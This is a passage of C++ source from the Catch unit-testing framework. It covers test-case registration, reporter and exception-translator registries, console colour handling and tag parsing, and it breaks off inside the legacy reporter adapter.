	std::vector<TestCase> const& getAllTestCasesSorted(IConfig const& config) {
		return getRegistryHub().getTestCaseRegistry().getAllTestsSorted(config);
	}

	class TestRegistry : public ITestCaseRegistry {
	public:
		TestRegistry()
			: m_currentSortOrder(RunTests::InDeclarationOrder),
			m_unnamedCount(0)
		{}
		virtual ~TestRegistry();

		virtual void registerTest(TestCase const& testCase) {
			std::string name = testCase.getTestCaseInfo().name;
			if (name == "") {
				std::ostringstream oss;
				oss << "Anonymous test case " << ++m_unnamedCount;
				return registerTest(testCase.withName(oss.str()));
			}
			m_functions.push_back(testCase);
		}

		virtual std::vector<TestCase> const& getAllTests() const {
			return m_functions;
		}
		virtual std::vector<TestCase> const& getAllTestsSorted(IConfig const& config) const {
			if (m_sortedFunctions.empty())
				enforceNoDuplicateTestCases(m_functions);

			if (m_currentSortOrder != config.runOrder() || m_sortedFunctions.empty()) {
				m_sortedFunctions = sortTests(config, m_functions);
				m_currentSortOrder = config.runOrder();
			}
			return m_sortedFunctions;
		}

	private:
		std::vector<TestCase> m_functions;
		mutable RunTests::InWhatOrder m_currentSortOrder;
		mutable std::vector<TestCase> m_sortedFunctions;
		size_t m_unnamedCount;
		std::ios_base::Init m_ostreamInit; // Forces cout/ cerr to be initialised
	};

	///////////////////////////////////////////////////////////////////////////

	class FreeFunctionTestCase : public SharedImpl<ITestCase> {
	public:

		FreeFunctionTestCase(TestFunction fun) : m_fun(fun) {}

		virtual void invoke() const {
			m_fun();
		}

	private:
		virtual ~FreeFunctionTestCase();

		TestFunction m_fun;
	};

	inline std::string extractClassName(std::string const& classOrQualifiedMethodName) {
		std::string className = classOrQualifiedMethodName;
		if (startsWith(className, "&"))
		{
			std::size_t lastColons = className.rfind("::");
			std::size_t penultimateColons = className.rfind("::", lastColons - 1);
			if (penultimateColons == std::string::npos)
				penultimateColons = 1;
			className = className.substr(penultimateColons, lastColons - penultimateColons);
		}
		return className;
	}

	void registerTestCase
	(ITestCase* testCase,
		char const* classOrQualifiedMethodName,
		NameAndDesc const& nameAndDesc,
		SourceLineInfo const& lineInfo) {

		getMutableRegistryHub().registerTest
		(makeTestCase
		(testCase,
			extractClassName(classOrQualifiedMethodName),
			nameAndDesc.name,
			nameAndDesc.description,
			lineInfo));
	}
	void registerTestCaseFunction
	(TestFunction function,
		SourceLineInfo const& lineInfo,
		NameAndDesc const& nameAndDesc) {
		registerTestCase(new FreeFunctionTestCase(function), "", nameAndDesc, lineInfo);
	}

	///////////////////////////////////////////////////////////////////////////

	AutoReg::AutoReg
	(TestFunction function,
		SourceLineInfo const& lineInfo,
		NameAndDesc const& nameAndDesc) {
		registerTestCaseFunction(function, lineInfo, nameAndDesc);
	}

	AutoReg::~AutoReg() {}

} // end namespace Catch

  // #included from: catch_reporter_registry.hpp
#define TWOBLUECUBES_CATCH_REPORTER_REGISTRY_HPP_INCLUDED

#include <map>

namespace Catch {

	class ReporterRegistry : public IReporterRegistry {

	public:

		virtual ~ReporterRegistry() CATCH_OVERRIDE {}

		virtual IStreamingReporter* create(std::string const& name, Ptr<IConfig const> const& config) const CATCH_OVERRIDE {
			FactoryMap::const_iterator it = m_factories.find(name);
			if (it == m_factories.end())
				return CATCH_NULL;
			return it->second->create(ReporterConfig(config));
		}

		void registerReporter(std::string const& name, Ptr<IReporterFactory> const& factory) {
			m_factories.insert(std::make_pair(name, factory));
		}
		void registerListener(Ptr<IReporterFactory> const& factory) {
			m_listeners.push_back(factory);
		}

		virtual FactoryMap const& getFactories() const CATCH_OVERRIDE {
			return m_factories;
		}
		virtual Listeners const& getListeners() const CATCH_OVERRIDE {
			return m_listeners;
		}

	private:
		FactoryMap m_factories;
		Listeners m_listeners;
	};
}

// #included from: catch_exception_translator_registry.hpp
#define TWOBLUECUBES_CATCH_EXCEPTION_TRANSLATOR_REGISTRY_HPP_INCLUDED

#ifdef __OBJC__
#import "Foundation/Foundation.h"
#endif

namespace Catch {

	class ExceptionTranslatorRegistry : public IExceptionTranslatorRegistry {
	public:
		~ExceptionTranslatorRegistry() {
			deleteAll(m_translators);
		}

		virtual void registerTranslator(const IExceptionTranslator* translator) {
			m_translators.push_back(translator);
		}

		virtual std::string translateActiveException() const {
			try {
#ifdef __OBJC__
				// In Objective-C try objective-c exceptions first
				@try {
					return tryTranslators();
				}
				@catch (NSException *exception) {
					return Catch::toString([exception description]);
				}
#else
				return tryTranslators();
#endif
			}
			catch (TestFailureException&) {
				throw;
			}
			catch (std::exception& ex) {
				return ex.what();
			}
			catch (std::string& msg) {
				return msg;
			}
			catch (const char* msg) {
				return msg;
			}
			catch (...) {
				return "Unknown exception";
			}
		}

		std::string tryTranslators() const {
			if (m_translators.empty())
				throw;
			else
				return m_translators[0]->translate(m_translators.begin() + 1, m_translators.end());
		}

	private:
		std::vector<const IExceptionTranslator*> m_translators;
	};
}

namespace Catch {

	namespace {

		class RegistryHub : public IRegistryHub, public IMutableRegistryHub {

			RegistryHub(RegistryHub const&);
			void operator=(RegistryHub const&);

		public: // IRegistryHub
			RegistryHub() {
			}
			virtual IReporterRegistry const& getReporterRegistry() const CATCH_OVERRIDE {
				return m_reporterRegistry;
			}
			virtual ITestCaseRegistry const& getTestCaseRegistry() const CATCH_OVERRIDE {
				return m_testCaseRegistry;
			}
			virtual IExceptionTranslatorRegistry& getExceptionTranslatorRegistry() CATCH_OVERRIDE {
				return m_exceptionTranslatorRegistry;
			}

		public: // IMutableRegistryHub
			virtual void registerReporter(std::string const& name, Ptr<IReporterFactory> const& factory) CATCH_OVERRIDE {
				m_reporterRegistry.registerReporter(name, factory);
			}
			virtual void registerListener(Ptr<IReporterFactory> const& factory) CATCH_OVERRIDE {
				m_reporterRegistry.registerListener(factory);
			}
			virtual void registerTest(TestCase const& testInfo) CATCH_OVERRIDE {
				m_testCaseRegistry.registerTest(testInfo);
			}
			virtual void registerTranslator(const IExceptionTranslator* translator) CATCH_OVERRIDE {
				m_exceptionTranslatorRegistry.registerTranslator(translator);
			}

		private:
			TestRegistry m_testCaseRegistry;
			ReporterRegistry m_reporterRegistry;
			ExceptionTranslatorRegistry m_exceptionTranslatorRegistry;
		};

		// Single, global, instance
		inline RegistryHub*& getTheRegistryHub() {
			static RegistryHub* theRegistryHub = CATCH_NULL;
			if (!theRegistryHub)
				theRegistryHub = new RegistryHub();
			return theRegistryHub;
		}
	}

	IRegistryHub& getRegistryHub() {
		return *getTheRegistryHub();
	}
	IMutableRegistryHub& getMutableRegistryHub() {
		return *getTheRegistryHub();
	}
	void cleanUp() {
		delete getTheRegistryHub();
		getTheRegistryHub() = CATCH_NULL;
		cleanUpContext();
	}
	std::string translateActiveException() {
		return getRegistryHub().getExceptionTranslatorRegistry().translateActiveException();
	}

} // end namespace Catch

  // #included from: catch_notimplemented_exception.hpp
#define TWOBLUECUBES_CATCH_NOTIMPLEMENTED_EXCEPTION_HPP_INCLUDED

#include <ostream>

namespace Catch {

	NotImplementedException::NotImplementedException(SourceLineInfo const& lineInfo)
		: m_lineInfo(lineInfo) {
		std::ostringstream oss;
		oss << lineInfo << ": function ";
		oss << "not implemented";
		m_what = oss.str();
	}

	const char* NotImplementedException::what() const CATCH_NOEXCEPT {
		return m_what.c_str();
	}

} // end namespace Catch

  // #included from: catch_context_impl.hpp
#define TWOBLUECUBES_CATCH_CONTEXT_IMPL_HPP_INCLUDED

  // #included from: catch_stream.hpp
#define TWOBLUECUBES_CATCH_STREAM_HPP_INCLUDED

#include <stdexcept>
#include <cstdio>
#include <iostream>

namespace Catch {

	template<typename WriterF, size_t bufferSize = 256>
	class StreamBufImpl : public StreamBufBase {
		char data[bufferSize];
		WriterF m_writer;

	public:
		StreamBufImpl() {
			setp(data, data + sizeof(data));
		}

		~StreamBufImpl() CATCH_NOEXCEPT {
			sync();
		}

	private:
		int overflow(int c) {
			sync();

			if (c != EOF) {
				if (pbase() == epptr())
					m_writer(std::string(1, static_cast<char>(c)));
				else
					sputc(static_cast<char>(c));
			}
			return 0;
		}

		int sync() {
			if (pbase() != pptr()) {
				m_writer(std::string(pbase(), static_cast<std::string::size_type>(pptr() - pbase())));
				setp(pbase(), epptr());
			}
			return 0;
		}
	};

	///////////////////////////////////////////////////////////////////////////

	FileStream::FileStream(std::string const& filename) {
		m_ofs.open(filename.c_str());
		if (m_ofs.fail()) {
			std::ostringstream oss;
			oss << "Unable to open file: '" << filename << "'";
			throw std::domain_error(oss.str());
		}
	}

	std::ostream& FileStream::stream() const {
		return m_ofs;
	}

	struct OutputDebugWriter {

		void operator()(std::string const&str) {
			writeToDebugConsole(str);
		}
	};

	DebugOutStream::DebugOutStream()
		: m_streamBuf(new StreamBufImpl<OutputDebugWriter>()),
		m_os(m_streamBuf.get())
	{}

	std::ostream& DebugOutStream::stream() const {
		return m_os;
	}

	// Store the streambuf from cout up-front because
	// cout may get redirected when running tests
	CoutStream::CoutStream()
		: m_os(Catch::cout().rdbuf())
	{}

	std::ostream& CoutStream::stream() const {
		return m_os;
	}

#ifndef CATCH_CONFIG_NOSTDOUT // If you #define this you must implement these functions
	std::ostream& cout() {
		return std::cout;
	}
	std::ostream& cerr() {
		return std::cerr;
	}
#endif
}

namespace Catch {

	class Context : public IMutableContext {

		Context() : m_config(CATCH_NULL), m_runner(CATCH_NULL), m_resultCapture(CATCH_NULL) {}
		Context(Context const&);
		void operator=(Context const&);

	public: // IContext
		virtual IResultCapture* getResultCapture() {
			return m_resultCapture;
		}
		virtual IRunner* getRunner() {
			return m_runner;
		}
		virtual size_t getGeneratorIndex(std::string const& fileInfo, size_t totalSize) {
			return getGeneratorsForCurrentTest()
				.getGeneratorInfo(fileInfo, totalSize)
				.getCurrentIndex();
		}
		virtual bool advanceGeneratorsForCurrentTest() {
			IGeneratorsForTest* generators = findGeneratorsForCurrentTest();
			return generators && generators->moveNext();
		}

		virtual Ptr<IConfig const> getConfig() const {
			return m_config;
		}

	public: // IMutableContext
		virtual void setResultCapture(IResultCapture* resultCapture) {
			m_resultCapture = resultCapture;
		}
		virtual void setRunner(IRunner* runner) {
			m_runner = runner;
		}
		virtual void setConfig(Ptr<IConfig const> const& config) {
			m_config = config;
		}

		friend IMutableContext& getCurrentMutableContext();

	private:
		IGeneratorsForTest* findGeneratorsForCurrentTest() {
			std::string testName = getResultCapture()->getCurrentTestName();

			std::map<std::string, IGeneratorsForTest*>::const_iterator it =
				m_generatorsByTestName.find(testName);
			return it != m_generatorsByTestName.end()
				? it->second
				: CATCH_NULL;
		}

		IGeneratorsForTest& getGeneratorsForCurrentTest() {
			IGeneratorsForTest* generators = findGeneratorsForCurrentTest();
			if (!generators) {
				std::string testName = getResultCapture()->getCurrentTestName();
				generators = createGeneratorsForTest();
				m_generatorsByTestName.insert(std::make_pair(testName, generators));
			}
			return *generators;
		}

	private:
		Ptr<IConfig const> m_config;
		IRunner* m_runner;
		IResultCapture* m_resultCapture;
		std::map<std::string, IGeneratorsForTest*> m_generatorsByTestName;
	};

	namespace {
		Context* currentContext = CATCH_NULL;
	}
	IMutableContext& getCurrentMutableContext() {
		if (!currentContext)
			currentContext = new Context();
		return *currentContext;
	}
	IContext& getCurrentContext() {
		return getCurrentMutableContext();
	}

	void cleanUpContext() {
		delete currentContext;
		currentContext = CATCH_NULL;
	}
}

// #included from: catch_console_colour_impl.hpp
#define TWOBLUECUBES_CATCH_CONSOLE_COLOUR_IMPL_HPP_INCLUDED

namespace Catch {
	namespace {

		struct IColourImpl {
			virtual ~IColourImpl() {}
			virtual void use(Colour::Code _colourCode) = 0;
		};

		struct NoColourImpl : IColourImpl {
			void use(Colour::Code) {}

			static IColourImpl* instance() {
				static NoColourImpl s_instance;
				return &s_instance;
			}
		};

	} // anon namespace
} // namespace Catch

#if !defined( CATCH_CONFIG_COLOUR_NONE ) && !defined( CATCH_CONFIG_COLOUR_WINDOWS ) && !defined( CATCH_CONFIG_COLOUR_ANSI )
#   ifdef CATCH_PLATFORM_WINDOWS
#       define CATCH_CONFIG_COLOUR_WINDOWS
#   else
#       define CATCH_CONFIG_COLOUR_ANSI
#   endif
#endif

#if defined ( CATCH_CONFIG_COLOUR_WINDOWS ) /////////////////////////////////////////

#ifndef NOMINMAX
#define NOMINMAX
#endif

#ifdef __AFXDLL
#include <AfxWin.h>
#else
#include <windows.h>
#endif

namespace Catch {
	namespace {

		class Win32ColourImpl : public IColourImpl {
		public:
			Win32ColourImpl() : stdoutHandle(GetStdHandle(STD_OUTPUT_HANDLE))
			{
				CONSOLE_SCREEN_BUFFER_INFO csbiInfo;
				GetConsoleScreenBufferInfo(stdoutHandle, &csbiInfo);
				originalForegroundAttributes = csbiInfo.wAttributes & ~(BACKGROUND_GREEN | BACKGROUND_RED | BACKGROUND_BLUE | BACKGROUND_INTENSITY);
				originalBackgroundAttributes = csbiInfo.wAttributes & ~(FOREGROUND_GREEN | FOREGROUND_RED | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
			}

			virtual void use(Colour::Code _colourCode) {
				switch (_colourCode) {
				case Colour::None:      return setTextAttribute(originalForegroundAttributes);
				case Colour::White:     return setTextAttribute(FOREGROUND_GREEN | FOREGROUND_RED | FOREGROUND_BLUE);
				case Colour::Red:       return setTextAttribute(FOREGROUND_RED);
				case Colour::Green:     return setTextAttribute(FOREGROUND_GREEN);
				case Colour::Blue:      return setTextAttribute(FOREGROUND_BLUE);
				case Colour::Cyan:      return setTextAttribute(FOREGROUND_BLUE | FOREGROUND_GREEN);
				case Colour::Yellow:    return setTextAttribute(FOREGROUND_RED | FOREGROUND_GREEN);
				case Colour::Grey:      return setTextAttribute(0);

				case Colour::LightGrey:     return setTextAttribute(FOREGROUND_INTENSITY);
				case Colour::BrightRed:     return setTextAttribute(FOREGROUND_INTENSITY | FOREGROUND_RED);
				case Colour::BrightGreen:   return setTextAttribute(FOREGROUND_INTENSITY | FOREGROUND_GREEN);
				case Colour::BrightWhite:   return setTextAttribute(FOREGROUND_INTENSITY | FOREGROUND_GREEN | FOREGROUND_RED | FOREGROUND_BLUE);

				case Colour::Bright: throw std::logic_error("not a colour");
				}
			}

		private:
			void setTextAttribute(WORD _textAttribute) {
				SetConsoleTextAttribute(stdoutHandle, _textAttribute | originalBackgroundAttributes);
			}
			HANDLE stdoutHandle;
			WORD originalForegroundAttributes;
			WORD originalBackgroundAttributes;
		};

		IColourImpl* platformColourInstance() {
			static Win32ColourImpl s_instance;

			Ptr<IConfig const> config = getCurrentContext().getConfig();
			UseColour::YesOrNo colourMode = config
				? config->useColour()
				: UseColour::Auto;
			if (colourMode == UseColour::Auto)
				colourMode = !isDebuggerActive()
				? UseColour::Yes
				: UseColour::No;
			return colourMode == UseColour::Yes
				? &s_instance
				: NoColourImpl::instance();
		}

	} // end anon namespace
} // end namespace Catch

#elif defined( CATCH_CONFIG_COLOUR_ANSI ) //////////////////////////////////////

#include <unistd.h>

namespace Catch {
	namespace {

		// use POSIX/ ANSI console terminal codes
		// Thanks to Adam Strzelecki for original contribution
		// (http://github.com/nanoant)
		// https://github.com/philsquared/Catch/pull/131
		class PosixColourImpl : public IColourImpl {
		public:
			virtual void use(Colour::Code _colourCode) {
				switch (_colourCode) {
				case Colour::None:
				case Colour::White:     return setColour("[0m");
				case Colour::Red:       return setColour("[0;31m");
				case Colour::Green:     return setColour("[0;32m");
				case Colour::Blue:      return setColour("[0:34m");
				case Colour::Cyan:      return setColour("[0;36m");
				case Colour::Yellow:    return setColour("[0;33m");
				case Colour::Grey:      return setColour("[1;30m");

				case Colour::LightGrey:     return setColour("[0;37m");
				case Colour::BrightRed:     return setColour("[1;31m");
				case Colour::BrightGreen:   return setColour("[1;32m");
				case Colour::BrightWhite:   return setColour("[1;37m");

				case Colour::Bright: throw std::logic_error("not a colour");
				}
			}
			static IColourImpl* instance() {
				static PosixColourImpl s_instance;
				return &s_instance;
			}

		private:
			void setColour(const char* _escapeCode) {
				Catch::cout() << '\033' << _escapeCode;
			}
		};

		IColourImpl* platformColourInstance() {
			Ptr<IConfig const> config = getCurrentContext().getConfig();
			UseColour::YesOrNo colourMode = config
				? config->useColour()
				: UseColour::Auto;
			if (colourMode == UseColour::Auto)
				colourMode = (!isDebuggerActive() && isatty(STDOUT_FILENO))
				? UseColour::Yes
				: UseColour::No;
			return colourMode == UseColour::Yes
				? PosixColourImpl::instance()
				: NoColourImpl::instance();
		}

	} // end anon namespace
} // end namespace Catch

#else  // not Windows or ANSI ///////////////////////////////////////////////

namespace Catch {

	static IColourImpl* platformColourInstance() { return NoColourImpl::instance(); }

} // end namespace Catch

#endif // Windows/ ANSI/ None

namespace Catch {

	Colour::Colour(Code _colourCode) : m_moved(false) { use(_colourCode); }
	Colour::Colour(Colour const& _other) : m_moved(false) { const_cast<Colour&>(_other).m_moved = true; }
	Colour::~Colour() { if (!m_moved) use(None); }

	void Colour::use(Code _colourCode) {
		static IColourImpl* impl = platformColourInstance();
		impl->use(_colourCode);
	}

} // end namespace Catch

  // #included from: catch_generators_impl.hpp
#define TWOBLUECUBES_CATCH_GENERATORS_IMPL_HPP_INCLUDED

#include <vector>
#include <string>
#include <map>

namespace Catch {

	struct GeneratorInfo : IGeneratorInfo {

		GeneratorInfo(std::size_t size)
			: m_size(size),
			m_currentIndex(0)
		{}

		bool moveNext() {
			if (++m_currentIndex == m_size) {
				m_currentIndex = 0;
				return false;
			}
			return true;
		}

		std::size_t getCurrentIndex() const {
			return m_currentIndex;
		}

		std::size_t m_size;
		std::size_t m_currentIndex;
	};

	///////////////////////////////////////////////////////////////////////////

	class GeneratorsForTest : public IGeneratorsForTest {

	public:
		~GeneratorsForTest() {
			deleteAll(m_generatorsInOrder);
		}

		IGeneratorInfo& getGeneratorInfo(std::string const& fileInfo, std::size_t size) {
			std::map<std::string, IGeneratorInfo*>::const_iterator it = m_generatorsByName.find(fileInfo);
			if (it == m_generatorsByName.end()) {
				IGeneratorInfo* info = new GeneratorInfo(size);
				m_generatorsByName.insert(std::make_pair(fileInfo, info));
				m_generatorsInOrder.push_back(info);
				return *info;
			}
			return *it->second;
		}

		bool moveNext() {
			std::vector<IGeneratorInfo*>::const_iterator it = m_generatorsInOrder.begin();
			std::vector<IGeneratorInfo*>::const_iterator itEnd = m_generatorsInOrder.end();
			for (; it != itEnd; ++it) {
				if ((*it)->moveNext())
					return true;
			}
			return false;
		}

	private:
		std::map<std::string, IGeneratorInfo*> m_generatorsByName;
		std::vector<IGeneratorInfo*> m_generatorsInOrder;
	};

	IGeneratorsForTest* createGeneratorsForTest()
	{
		return new GeneratorsForTest();
	}

} // end namespace Catch

  // #included from: catch_assertionresult.hpp
#define TWOBLUECUBES_CATCH_ASSERTIONRESULT_HPP_INCLUDED

namespace Catch {

	AssertionInfo::AssertionInfo(std::string const& _macroName,
		SourceLineInfo const& _lineInfo,
		std::string const& _capturedExpression,
		ResultDisposition::Flags _resultDisposition)
		: macroName(_macroName),
		lineInfo(_lineInfo),
		capturedExpression(_capturedExpression),
		resultDisposition(_resultDisposition)
	{}

	AssertionResult::AssertionResult() {}

	AssertionResult::AssertionResult(AssertionInfo const& info, AssertionResultData const& data)
		: m_info(info),
		m_resultData(data)
	{}

	AssertionResult::~AssertionResult() {}

	// Result was a success
	bool AssertionResult::succeeded() const {
		return Catch::isOk(m_resultData.resultType);
	}

	// Result was a success, or failure is suppressed
	bool AssertionResult::isOk() const {
		return Catch::isOk(m_resultData.resultType) || shouldSuppressFailure(m_info.resultDisposition);
	}

	ResultWas::OfType AssertionResult::getResultType() const {
		return m_resultData.resultType;
	}

	bool AssertionResult::hasExpression() const {
		return !m_info.capturedExpression.empty();
	}

	bool AssertionResult::hasMessage() const {
		return !m_resultData.message.empty();
	}

	std::string AssertionResult::getExpression() const {
		if (isFalseTest(m_info.resultDisposition))
			return "!" + m_info.capturedExpression;
		else
			return m_info.capturedExpression;
	}
	std::string AssertionResult::getExpressionInMacro() const {
		if (m_info.macroName.empty())
			return m_info.capturedExpression;
		else
			return m_info.macroName + "( " + m_info.capturedExpression + " )";
	}

	bool AssertionResult::hasExpandedExpression() const {
		return hasExpression() && getExpandedExpression() != getExpression();
	}

	std::string AssertionResult::getExpandedExpression() const {
		return m_resultData.reconstructedExpression;
	}

	std::string AssertionResult::getMessage() const {
		return m_resultData.message;
	}
	SourceLineInfo AssertionResult::getSourceInfo() const {
		return m_info.lineInfo;
	}

	std::string AssertionResult::getTestMacroName() const {
		return m_info.macroName;
	}

} // end namespace Catch

  // #included from: catch_test_case_info.hpp
#define TWOBLUECUBES_CATCH_TEST_CASE_INFO_HPP_INCLUDED

namespace Catch {

	inline TestCaseInfo::SpecialProperties parseSpecialTag(std::string const& tag) {
		if (startsWith(tag, ".") ||
			tag == "hide" ||
			tag == "!hide")
			return TestCaseInfo::IsHidden;
		else if (tag == "!throws")
			return TestCaseInfo::Throws;
		else if (tag == "!shouldfail")
			return TestCaseInfo::ShouldFail;
		else if (tag == "!mayfail")
			return TestCaseInfo::MayFail;
		else
			return TestCaseInfo::None;
	}
	inline bool isReservedTag(std::string const& tag) {
		return parseSpecialTag(tag) == TestCaseInfo::None && tag.size() > 0 && !isalnum(tag[0]);
	}
	inline void enforceNotReservedTag(std::string const& tag, SourceLineInfo const& _lineInfo) {
		if (isReservedTag(tag)) {
			{
				Colour colourGuard(Colour::Red);
				Catch::cerr()
					<< "Tag name [" << tag << "] not allowed.\n"
					<< "Tag names starting with non alpha-numeric characters are reserved\n";
			}
			{
				Colour colourGuard(Colour::FileName);
				Catch::cerr() << _lineInfo << std::endl;
			}
			exit(1);
		}
	}

	TestCase makeTestCase(ITestCase* _testCase,
		std::string const& _className,
		std::string const& _name,
		std::string const& _descOrTags,
		SourceLineInfo const& _lineInfo)
	{
		bool isHidden(startsWith(_name, "./")); // Legacy support

												// Parse out tags
		std::set<std::string> tags;
		std::string desc, tag;
		bool inTag = false;
		for (std::size_t i = 0; i < _descOrTags.size(); ++i) {
			char c = _descOrTags[i];
			if (!inTag) {
				if (c == '[')
					inTag = true;
				else
					desc += c;
			}
			else {
				if (c == ']') {
					TestCaseInfo::SpecialProperties prop = parseSpecialTag(tag);
					if (prop == TestCaseInfo::IsHidden)
						isHidden = true;
					else if (prop == TestCaseInfo::None)
						enforceNotReservedTag(tag, _lineInfo);

					tags.insert(tag);
					tag.clear();
					inTag = false;
				}
				else
					tag += c;
			}
		}
		if (isHidden) {
			tags.insert("hide");
			tags.insert(".");
		}

		TestCaseInfo info(_name, _className, desc, tags, _lineInfo);
		return TestCase(_testCase, info);
	}

	void setTags(TestCaseInfo& testCaseInfo, std::set<std::string> const& tags)
	{
		testCaseInfo.tags = tags;
		testCaseInfo.lcaseTags.clear();

		std::ostringstream oss;
		for (std::set<std::string>::const_iterator it = tags.begin(), itEnd = tags.end(); it != itEnd; ++it) {
			oss << "[" << *it << "]";
			std::string lcaseTag = toLower(*it);
			testCaseInfo.properties = static_cast<TestCaseInfo::SpecialProperties>(testCaseInfo.properties | parseSpecialTag(lcaseTag));
			testCaseInfo.lcaseTags.insert(lcaseTag);
		}
		testCaseInfo.tagsAsString = oss.str();
	}

	TestCaseInfo::TestCaseInfo(std::string const& _name,
		std::string const& _className,
		std::string const& _description,
		std::set<std::string> const& _tags,
		SourceLineInfo const& _lineInfo)
		: name(_name),
		className(_className),
		description(_description),
		lineInfo(_lineInfo),
		properties(None)
	{
		setTags(*this, _tags);
	}

	TestCaseInfo::TestCaseInfo(TestCaseInfo const& other)
		: name(other.name),
		className(other.className),
		description(other.description),
		tags(other.tags),
		lcaseTags(other.lcaseTags),
		tagsAsString(other.tagsAsString),
		lineInfo(other.lineInfo),
		properties(other.properties)
	{}

	bool TestCaseInfo::isHidden() const {
		return (properties & IsHidden) != 0;
	}
	bool TestCaseInfo::throws() const {
		return (properties & Throws) != 0;
	}
	bool TestCaseInfo::okToFail() const {
		return (properties & (ShouldFail | MayFail)) != 0;
	}
	bool TestCaseInfo::expectedToFail() const {
		return (properties & (ShouldFail)) != 0;
	}

	TestCase::TestCase(ITestCase* testCase, TestCaseInfo const& info) : TestCaseInfo(info), test(testCase) {}

	TestCase::TestCase(TestCase const& other)
		: TestCaseInfo(other),
		test(other.test)
	{}

	TestCase TestCase::withName(std::string const& _newName) const {
		TestCase other(*this);
		other.name = _newName;
		return other;
	}

	void TestCase::swap(TestCase& other) {
		test.swap(other.test);
		name.swap(other.name);
		className.swap(other.className);
		description.swap(other.description);
		tags.swap(other.tags);
		lcaseTags.swap(other.lcaseTags);
		tagsAsString.swap(other.tagsAsString);
		std::swap(TestCaseInfo::properties, static_cast<TestCaseInfo&>(other).properties);
		std::swap(lineInfo, other.lineInfo);
	}

	void TestCase::invoke() const {
		test->invoke();
	}

	bool TestCase::operator == (TestCase const& other) const {
		return  test.get() == other.test.get() &&
			name == other.name &&
			className == other.className;
	}

	bool TestCase::operator < (TestCase const& other) const {
		return name < other.name;
	}
	TestCase& TestCase::operator = (TestCase const& other) {
		TestCase temp(other);
		swap(temp);
		return *this;
	}

	TestCaseInfo const& TestCase::getTestCaseInfo() const
	{
		return *this;
	}

} // end namespace Catch

  // #included from: catch_version.hpp
#define TWOBLUECUBES_CATCH_VERSION_HPP_INCLUDED

namespace Catch {

	Version::Version
	(unsigned int _majorVersion,
		unsigned int _minorVersion,
		unsigned int _patchNumber,
		std::string const& _branchName,
		unsigned int _buildNumber)
		: majorVersion(_majorVersion),
		minorVersion(_minorVersion),
		patchNumber(_patchNumber),
		branchName(_branchName),
		buildNumber(_buildNumber)
	{}

	std::ostream& operator << (std::ostream& os, Version const& version) {
		os << version.majorVersion << "."
			<< version.minorVersion << "."
			<< version.patchNumber;

		if (!version.branchName.empty()) {
			os << "-" << version.branchName
				<< "." << version.buildNumber;
		}
		return os;
	}

	Version libraryVersion(1, 5, 2, "", 0);

}

// #included from: catch_message.hpp
#define TWOBLUECUBES_CATCH_MESSAGE_HPP_INCLUDED

namespace Catch {

	MessageInfo::MessageInfo(std::string const& _macroName,
		SourceLineInfo const& _lineInfo,
		ResultWas::OfType _type)
		: macroName(_macroName),
		lineInfo(_lineInfo),
		type(_type),
		sequence(++globalCount)
	{}

	// This may need protecting if threading support is added
	unsigned int MessageInfo::globalCount = 0;

	////////////////////////////////////////////////////////////////////////////

	ScopedMessage::ScopedMessage(MessageBuilder const& builder)
		: m_info(builder.m_info)
	{
		m_info.message = builder.m_stream.str();
		getResultCapture().pushScopedMessage(m_info);
	}
	ScopedMessage::ScopedMessage(ScopedMessage const& other)
		: m_info(other.m_info)
	{}

	ScopedMessage::~ScopedMessage() {
		getResultCapture().popScopedMessage(m_info);
	}

} // end namespace Catch

  // #included from: catch_legacy_reporter_adapter.hpp
#define TWOBLUECUBES_CATCH_LEGACY_REPORTER_ADAPTER_HPP_INCLUDED

  // #included from: catch_legacy_reporter_adapter.h
#define TWOBLUECUBES_CATCH_LEGACY_REPORTER_ADAPTER_H_INCLUDED

namespace Catch
{
	// Deprecated
	struct IReporter : IShared {
		virtual ~IReporter();

		virtual bool shouldRedirectStdout() const = 0;

		virtual void StartTesting() = 0;
		virtual void EndTesting(Totals const& totals) = 0;
		virtual void StartGroup(std::string const& groupName) = 0;
		virtual void EndGroup(std::string const& groupName, Totals const& totals) = 0;
		virtual void StartTestCase(TestCaseInfo const& testInfo) = 0;
		virtual void EndTestCase(TestCaseInfo const& testInfo, Totals const& totals, std::string const& stdOut, std::string const& stdErr) = 0;
		virtual void StartSection(std::string const& sectionName, std::string const& description) = 0;
		virtual void EndSection(std::string const& sectionName, Counts const& assertions) = 0;
		virtual void NoAssertionsInSection(std::string const& sectionName) = 0;
		virtual void NoAssertionsInTestCase(std::string const& testName) = 0;
		virtual void Aborted() = 0;
		virtual void Result(AssertionResult const& result) = 0;
	};

	class LegacyReporterAdapter : public SharedImpl<IStreamingReporter>
	{
	public:
		LegacyReporterAdapter(Ptr<IReporter> const& legacyReporter);
		virtual ~LegacyReporterAdapter();

		virtual ReporterPreferences getPreferences() const;
		virtual void noMatchingTestCases(std::string const&);
		virtual void testRunStarting(TestRunInfo const&);
		virtual void testGroupStarting(GroupInfo const& groupInfo);
		virtual void testCaseStarting(TestCaseInfo const& testInfo);
		virtual void sectionStarting(SectionInfo const& sectionInfo);
		virtual void assertionStarting(AssertionInfo const&);
		virtual bool assertionEnded(AssertionStats const& assertionStats);
		virtual void sectionEnded(SectionStats const& sectionStats);
		virtual void testCaseEnded(TestCaseStats const& testCaseStats);
		virtual void testGroupEnded(TestGroupStats const& testGroupStats);
		virtual void testRunEnded(TestRunStats const& testRunStats);
		virtual void skipTest(TestCaseInfo const&);

	private:
		Ptr<IReporter> m_legacyReporter;
	};
}

namespace Catch
{
	LegacyReporterAdapter::LegacyReporterAdapter(Ptr<IReporter> const& legacyReporter)
		: m_legacyReporter(legacyReporter)
	{}
	LegacyReporterAdapter::~LegacyReporterAdapter() {}

	ReporterPreferences LegacyReporterAdapter::getPreferences() const {
		ReporterPreferences prefs;
		prefs.shouldRedirectStdOut = m_legacyReporter->shouldRedirectStdout();
		return prefs;
	}

	void LegacyReporterAdapter::noMatchingTestCases(std::string const&) {}
	void LegacyReporterAdapter::testRunStarting(TestRunInfo const&) {
		m_legacyReporter->StartTesting();
	}
	void LegacyReporterAdapter::testGroupStarting(GroupInfo const& groupInfo) {
		m_legacyReporter->StartGroup(groupInfo.name);
	}
	void LegacyReporterAdapter::testCaseStarting(TestCaseInfo const& testInfo) {
		m_legacyReporter->StartTestCase(testInfo);
	}
	void LegacyReporterAdapter::sectionStarting(SectionInfo const& sectionInfo) {
		m_legacyReporter->StartSection(sectionInfo.name, sectionInfo.description);
	}
	void LegacyReporterAdapter::assertionStarting(AssertionInfo const&) {
		// Not on legacy interface
	}

	bool LegacyReporterAdapter::assertionEnded(AssertionStats const& assertionStats) {
